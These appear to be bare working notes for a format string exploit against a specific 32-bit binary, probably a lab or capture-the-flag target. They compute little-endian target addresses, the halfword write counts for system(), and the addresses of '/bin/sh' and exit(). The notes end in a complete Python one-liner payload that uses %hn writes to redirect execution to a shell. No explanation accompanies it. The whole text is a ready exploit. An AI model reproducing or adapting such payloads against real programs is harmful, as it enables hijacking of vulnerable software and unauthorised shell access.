format string attack
addr1=8048370
big_endian=\x08\x04\x83\x70
little_endian=\x70\x83\x04\x08
addr2=8048372
big_endian=\x08\x04\x83\x72
little_endian=\x72\x83\x04\x08

binsh=f7f897ec
big_endian=\xf7\xf8\x97\xec
little_endian=\xec\x97\xf8\xf7

system_addr=f7e6aed0

exit_addr=0xf7e5eb70
exit_endian=\xf7\xe5\xeb\x70
exit_endian=\x70\xeb\xe5\xf7

h1=44752
h2=63462-h1 = 18710

python -c 'print(b"\x70\x83\x04\x08" + b"\x72\x83\x04\x08" + b"%44752d%7$hn" + b"%18710d%8$hn" + b"\xec\x97\xf8\xf7" + b"\x70\xeb\xe5\xf7" + "A"*60)'
